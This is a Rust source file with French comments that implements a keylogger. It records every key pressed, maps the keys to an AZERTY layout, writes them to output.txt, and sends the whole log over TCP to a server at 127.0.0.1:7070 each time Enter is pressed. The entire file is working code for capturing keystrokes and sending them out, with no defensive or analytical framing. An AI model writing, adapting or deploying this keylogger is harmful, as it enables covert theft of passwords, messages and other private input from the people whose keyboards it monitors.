use device_query::{DeviceQuery, DeviceState, Keycode};
use std::fs::File;
use std::fs::OpenOptions;
use std::io::Seek;
use std::io::{Read, Write};
use std::net::TcpStream;

// Fonction pour créer un fichier output.txt ou l'ouvrir s'il existe déjà
fn create_file() -> std::io::Result<File> {
    OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(true)
        .create(true)
        .open("output.txt")
}

// Fonction pour convertir les touches entrées en AZERTY
fn key_to_string(key: Keycode) -> String {
    match key {
        Keycode::Key0 => "à".to_string(),
        Keycode::Key1 => "&".to_string(),
        Keycode::Key2 => "é".to_string(),
        Keycode::Key3 => "\"".to_string(),
        Keycode::Key4 => "'".to_string(),
        Keycode::Key5 => "(".to_string(),
        Keycode::Key6 => "-".to_string(),
        Keycode::Key7 => "è".to_string(),
        Keycode::Key8 => "_".to_string(),
        Keycode::Key9 => "ç".to_string(),
        Keycode::A => "z".to_string(),
        Keycode::B => "b".to_string(),
        Keycode::C => "c".to_string(),
        Keycode::D => "d".to_string(),
        Keycode::E => "e".to_string(),
        Keycode::F => "f".to_string(),
        Keycode::G => "g".to_string(),
        Keycode::H => "h".to_string(),
        Keycode::I => "i".to_string(),
        Keycode::J => "j".to_string(),
        Keycode::K => "k".to_string(),
        Keycode::L => "l".to_string(),
        Keycode::M => ",".to_string(),
        Keycode::N => "n".to_string(),
        Keycode::O => "o".to_string(),
        Keycode::P => "p".to_string(),
        Keycode::Q => "a".to_string(),
        Keycode::R => "r".to_string(),
        Keycode::S => "s".to_string(),
        Keycode::T => "t".to_string(),
        Keycode::U => "u".to_string(),
        Keycode::V => "v".to_string(),
        Keycode::W => "z".to_string(),
        Keycode::X => "x".to_string(),
        Keycode::Y => "y".to_string(),
        Keycode::Z => "w".to_string(),
        Keycode::F1 => "\n[F1]\n".to_string(),
        Keycode::F2 => "\n[F2]\n".to_string(),
        Keycode::F3 => "\n[F3]\n".to_string(),
        Keycode::F4 => "\n[F4]\n".to_string(),
        Keycode::F5 => "\n[F5]\n".to_string(),
        Keycode::F6 => "\n[F6]\n".to_string(),
        Keycode::F7 => "\n[F7]\n".to_string(),
        Keycode::F8 => "\n[F8]\n".to_string(),
        Keycode::F9 => "\n[F9]\n".to_string(),
        Keycode::F10 => "\n[F10]\n".to_string(),
        Keycode::F11 => "\n[F11]\n".to_string(),
        Keycode::F12 => "\n[F12]\n".to_string(),
        Keycode::Escape => "\n[Echap]\n".to_string(),
        Keycode::Space => "[Space]".to_string(),
        Keycode::LControl => "\n[LControl]\n".to_string(),
        Keycode::RControl => "\n[RControl]\n".to_string(),
        Keycode::LShift => "[LShift]".to_string(),
        Keycode::RShift => "[RShift]".to_string(),
        Keycode::LAlt => "\n[LAlt]\n".to_string(),
        Keycode::RAlt => "\n[RAlt]\n".to_string(),
        Keycode::Meta => "\n[Meta]\n".to_string(),
        Keycode::Enter => "\n[Enter]\n".to_string(),
        Keycode::Up => "\n[Up]\n".to_string(),
        Keycode::Down => "\n[Down]\n".to_string(),
        Keycode::Left => "\n[Left]\n".to_string(),
        Keycode::Right => "\n[Right]\n".to_string(),
        Keycode::Backspace => "\n[Backspace]\n".to_string(),
        Keycode::CapsLock => "\n[CapsLock]\n".to_string(),
        Keycode::Tab => "\n[Tab]\n".to_string(),
        Keycode::Home => "\n[Home]\n".to_string(),
        Keycode::End => "\n[End]\n".to_string(),
        Keycode::PageUp => "\n[PageUp]\n".to_string(),
        Keycode::PageDown => "\n[PageDown]\n".to_string(),
        Keycode::Insert => "\n[Insert]\n".to_string(),
        Keycode::Delete => "\n[Delete]\n".to_string(),
        Keycode::Numpad0 => "0".to_string(),
        Keycode::Numpad1 => "1".to_string(),
        Keycode::Numpad2 => "2".to_string(),
        Keycode::Numpad3 => "3".to_string(),
        Keycode::Numpad4 => "4".to_string(),
        Keycode::Numpad5 => "5".to_string(),
        Keycode::Numpad6 => "6".to_string(),
        Keycode::Numpad7 => "7".to_string(),
        Keycode::Numpad8 => "8".to_string(),
        Keycode::Numpad9 => "9".to_string(),
        Keycode::NumpadSubtract => "-".to_string(),
        Keycode::NumpadAdd => "+".to_string(),
        Keycode::NumpadDivide => "!".to_string(),
        Keycode::NumpadMultiply => "*".to_string(),
        Keycode::Grave => "".to_string(),
        Keycode::Minus => "".to_string(),
        Keycode::Equal => "=".to_string(),
        Keycode::LeftBracket => "^".to_string(),
        Keycode::RightBracket => "$".to_string(),
        Keycode::BackSlash => "*".to_string(),
        Keycode::Semicolon => "m".to_string(),
        Keycode::Apostrophe => "ù".to_string(),
        Keycode::Comma => ";".to_string(),
        Keycode::Dot => ":".to_string(),
        Keycode::Slash => "ù".to_string(),
        //_ => todo!(),
    }
}

fn main() {
    // Création d'une instance de DeviceState pour surveiller les touches du clavier
    let device_state = DeviceState::new();
    // Initialisation d'un vecteur pour stocker les touches précédentes
    let mut prev_keys = vec![];
    // Création ou ouverture du fichier output.txt en mode lecture/écriture
    let mut output = create_file().unwrap();

    loop {
        // Récupération des touches actuellement pressées
        let keys = device_state.get_keys();
        // Vérifie si les touches ont changé depuis la dernière itération et si au moins une touche est pressée
        if keys != prev_keys && !keys.is_empty() {
            // Conversion du vecteur de touches en une chaîne de caractères
            let keys_str: Vec<String> = keys.iter().map(|&k| key_to_string(k)).collect();
            let keys_joined = keys_str.join(" ");
            // Affichage de la chaîne de touches dans la console
            println!("{}", keys_joined);
            // Écriture de la chaîne de touches dans le fichier output.txt
            if let Err(err) = writeln!(output, "{:?}", keys_joined) {
                eprintln!("Failed to write to output file: {}", err);
            }
            // Si la touche Enter est pressée, tentative de connexion à un serveur TCP et envoi du contenu du fichier
            if keys.contains(&Keycode::Enter) {
                let mut stream =
                    TcpStream::connect("127.0.0.1:7070").expect("Failed to connect to server.");
                // Rembobinage du fichier pour le lire depuis le début
                output.rewind().unwrap();
                // Lecture du contenu du fichier dans un tampon
                let mut buffer_send = Vec::new();
                output.read_to_end(&mut buffer_send).unwrap();
                // Envoi du contenu du fichier au serveur
                stream
                    .write_all(&buffer_send)
                    .expect("Failed to send file to server");
            }
        }
        // Met à jour les touches précédentes
        prev_keys = keys;
    }
}
